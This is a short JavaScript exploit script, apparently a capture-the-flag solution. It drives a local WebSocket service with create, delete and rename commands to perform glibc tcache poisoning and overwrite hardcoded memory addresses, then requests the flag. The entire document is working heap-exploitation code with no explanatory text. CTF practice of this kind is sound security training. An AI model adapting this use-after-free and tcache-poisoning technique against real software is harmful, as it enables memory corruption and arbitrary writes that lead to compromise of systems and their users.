ws = new WebSocket("ws://127.0.0.1:9001");

const onOpen = async () => {
  const waitMsg = () =>
    new Promise((resolve, reject) => {
      const onMsg = () => {
        ws.removeEventListener("message", onMsg);
        ws.removeEventListener("error", onError);
        resolve();
      };
      const onError = () => {
        ws.removeEventListener("message", onMsg);
        ws.removeEventListener("error", onError);
        reject();
      };
      ws.addEventListener("message", onMsg);
      ws.addEventListener("error", onError);
    });
  const cmd = async (msg) => {
    ws.send(msg);
    return await waitMsg();
  };

  encoder = new TextEncoder();

  async function tcache_poison(addr, content) {
    await cmd("stand_create 0 128 A\n");
    await cmd("stand_create 1 128 A\n");
    await cmd("stand_delete 0\n");
    await cmd("stand_delete 1\n");

    prefix = encoder.encode("stand_rename 1 ");
    suffix = encoder.encode("\n");
    msg = new Uint8Array(prefix.length + 8 + suffix.length);
    view = new DataView(msg.buffer);
    msg.set(prefix);
    view.setBigUint64(prefix.length, addr - 8n, true);
    msg.set(suffix, prefix.length + 8);
    await cmd(msg);

    await cmd("stand_create 2 128 A\n");
    await cmd("stand_create 3 128 " + content + "\n");
  }

  await tcache_poison(0x40630an, "A");
  await tcache_poison(0x406200n, "AAAABBBBCCCC");

  await cmd("send_flag CCCC\n");
};

ws.onopen = () => onOpen().catch(console.error);
